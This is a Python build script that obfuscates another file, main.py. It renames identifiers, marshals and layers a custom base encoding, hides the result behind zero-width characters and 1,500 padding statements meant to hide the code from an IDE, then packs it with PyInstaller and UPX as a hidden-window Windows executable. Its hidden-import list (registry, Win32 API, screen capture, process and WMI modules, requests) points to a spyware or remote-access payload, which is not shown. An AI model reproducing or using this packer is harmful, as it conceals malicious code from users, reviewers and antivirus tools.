import subprocess, threading, requests, marshal, random, base64, string, math, zlib, os
from tqdm import tqdm

class Obfuscate:
    def __init__(self):
        file = open("main.py", "rb").read().decode()
        formatted = self.format(file)
        self.code = self.encode_file(formatted)

    def in_string(self, pointer, line):
        quotes = ['"', "'"]
        left = 0
        right = 0
        if not any([quote in line for quote in quotes]):
            return False
        for quote in quotes:
            if quote in line:
                left = line[: pointer + 1].count(quote)
                right = line[pointer:].count(quote)

                fstring = line[line.index(quote) - 1] == "f"
                fleft = line[:pointer].count("{") + line[:pointer].count("}")
                fright = line[pointer:].count("{") + line[pointer:].count("}")

                if ((left % 2) or (right % 2)) and (right and left):
                    if fstring and ((fleft % 2) or (fright % 2)) and (fright and fleft):
                        continue
                    return True
        return False

    def encode(self, x, base):
        if not x:
            return 0

        log = math.floor(math.log(x, base))

        st = [0] * (log + 1)
        st[-1] = 1
        if log:
            x -= base**log

        while True:
            if x >= base:
                log = math.floor(math.log(x, base))
                x -= base**log
                st[log] += 1
                if st[log] > self.highest:
                    self.highest = st[log]
            else:
                st[0] = x
                if st[0] > self.highest:
                    self.highest = x
                return "".join([str(self.key[char]) for char in st[::-1]])

    def decode(self, x, base):
        result = 0
        for count, char in enumerate(str(x)[::-1]):
            result += int(self.key.index(str(char))) * (base**count)

        return result

    def format(self, file):
        spec_chars = [".", ",", "(", ")", "=", "+", "-", ":", ">", "<", "!", "[", "]"]
        blacklist = ["__init__", "start", "stop", "connect", "wait"]

        newFile = []
        classnames = []
        functionnames = []
        for line in file.splitlines():
            if ("#" in line) and (not self.in_string(line.rindex("#"), line)):
                line = line[: line.rindex("#")]

            for char in spec_chars:
                if (char in line) and (not self.in_string(line.index(char), line)):
                    line = line.replace(" " + char, char)

            newFile.append(line)

            if "class " in line:
                name = (
                    line[line.index("class ") + 6 :].replace(" ", "").replace(":", "")
                )
                if "(" in line:
                    name = name[: name.index("(")]
                classnames.append(name)

            elif "def " in line:
                try:
                    name = line[line.index("def ") + 4 : line.index("(")]
                except:
                    continue
                if (name.startswith("__") and name.endswith("__")) or name in blacklist:
                    continue
                functionnames.append(name)

        print(functionnames)

        newFile2 = []
        classnames = {
            classname: "O" + "".join(random.choices(["0", "O"], k=16))
            for classname in classnames
        }
        functionnames = {
            function: "O" + "".join(random.choices(["0", "O"], k=16))
            for function in functionnames
        }
        spec_chars += [" "]
        for line in newFile:
            for classname in classnames.keys():
                if (classname in line) and (
                    not self.in_string(line.index(classname), line)
                ):
                    line = line.replace(classname, classnames[classname])

            for function in functionnames.keys():
                if (
                    (function in line)
                    and (not self.in_string(line.index(function), line))
                    and (
                        line.index(function) + len(function) >= len(line)
                        or line[line.index(function) + len(function)] in spec_chars
                    )
                    and (line[line.index(function) - 1] in spec_chars)
                ):
                    line = line.replace(function, functionnames[function])

            newFile2.append(line)

        file = "\n".join(newFile2).replace("    ", " ")
        return file

    def encode_file(self, code):
        recursion = 2  # get's exponentially laggier, the higher this number, but more "encrypted"

        base = 55000  # Must be a whole number, 2 - 55000
        indent = 1500  # How many indents should be used to space out the actual code and the pass. Used to hide the code from a IDE
        bytes_allowed = True  # If disabled then base cannot be above 93

        if bytes_allowed:
            self.key = list(map(chr, range(94, 94 + base)))
        else:
            self.key = list(map(chr, range(33, 34 + base)))

        blacklist = ["'", "`", "\\"]

        for item in blacklist:
            if item in self.key:
                self.key.remove(item)
                base -= 1

        random.shuffle(self.key)
        self.highest = 0

        marshals = marshal.dumps(compile(code, '', 'exec'))

        code = f"import marshal;exec(marshal.loads({marshals}))"

        enc2 = " ".join([str(self.encode(ord(chr), base)) for chr in "exec"])
        enc3 = " ".join([str(self.encode(ord(chr), base)) for chr in "compile"])

        indents = ";lambda s=None:" + ";lambda:".join(
            [str(hex(random.randint(10**200, 10**201))) for _ in range(indent)]
        )

        for n in tqdm(range(recursion)):

            if n + 1 == recursion:
                base = 2
                self.key = ["​", "‍", "‎"]
                imports = f"pass{indents};" # Overwrite, hidden-import

            else:
                imports = ""
                random.shuffle(self.key)

            enc = "‌".join([(str(self.encode(ord(chr), base))) for chr in code])
            enc2 = " ".join([(str(self.encode(ord(chr), base))) for chr in "exec"])
            enc3 = " ".join([(str(self.encode(ord(chr), base))) for chr in "compile"])

            code = f"""{imports}O000O0OO000O=lambda m: '{''.join(self.key)}';(eval(eval(''.join([chr(sum([O000O0OO000O(++{base}**2).index(str(ch))*({hex(base)}**c) for c, ch in enumerate(str(x)[::-0x1])]))for x in('{enc3}'.split(' '))]))(''.join([chr(sum([O000O0OO000O(++{base}**2).index(str(ch))*({hex(base)}**c) for c, ch in enumerate(str(x)[::-0x1])]))for x in('{enc2}'.split(' '))]), "", dir(__builtins__)[dir(__builtins__).index('enumerate')+0x1])))(eval(''.join([chr(sum([O000O0OO000O(++{base}**2).index(str(ch))*({hex(base)}**c) for c, ch in enumerate(str(x)[::-0x1])]))for x in('{enc3}'.split(' '))]))(''.join([chr(sum([O000O0OO000O(++{base}**2).index(str(ch))*({hex(base)}**c) for c, ch in enumerate(str(x)[::-0x1])]))for x in('{enc}'.split('‌'))]), "", dir(__builtins__)[dir(__builtins__).index('enumerate')+0x2]))"""

        # src = f'''{message};eval(dir(__builtins__)[0x68-1])(__import__('zlib').decompress(__import__('base64').b64decode(b'{base64.b64encode(zlib.compress(src.encode())).decode()}')).decode())'''
        # code = src.replace("-.", "-1")

        return code

with open("output.py", "wb") as file:
    src = Obfuscate().code
    file.write(src.encode())

default_imports = [
    '--hidden-import','winapy_user',
    '--hidden-import','subprocess',
    '--hidden-import','winapy_con',
    '--hidden-import','winapy_mme',
    '--hidden-import','win32file',
    '--hidden-import','pythoncom',
    '--hidden-import','threading',
    '--hidden-import','requests',
    '--hidden-import','winsound', 
    '--hidden-import','win32api',
    '--hidden-import','win32gui', 
    '--hidden-import','win32con',
    '--hidden-import','win32ui', 
    '--hidden-import','marshal',
    '--hidden-import','random',  
    '--hidden-import','winreg',
    '--hidden-import','base64',
    '--hidden-import','psutil',
    '--hidden-import','shutil',
    '--hidden-import','string',
    '--hidden-import','msvcrt', 
    '--hidden-import','ctypes',
    '--hidden-import','scipy',
    '--hidden-import','shlex',
    '--hidden-import','time',
    '--hidden-import','json',
    '--hidden-import','uuid',
    '--hidden-import','math',
    '--hidden-import','mss',
    '--hidden-import','sys',
    '--hidden-import','wmi',
    '--hidden-import','ssl',
    '--hidden-import','re',
    '--hidden-import','io',
    '--hidden-import','os',
]

server_imports = [
    '--hidden-import', 'tkinter'
]

dir = os.path.dirname(os.path.realpath(__file__))

yes = ["yes", "y", "ye", "yeah", "bet", "ok"]

imports = default_imports + server_imports
windowed = input("Hide Window? >") in yes
icon = input("Icon File >")

command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed' if windowed else '', '--onefile', '--clean'] + imports + ['--icon', icon if icon else 'NONE', '--upx-dir', 'build\\upx', '--upx-exclude', '_uuid.pyd', '--upx-exclude', 'python3.dll', '--workpath', 'build', '--specpath', 'build\\spec'] + [f'{dir}\\output.py']
for _ in range(command.count('')):
    command.remove('')
print(command)

subprocess.call(command, shell=True)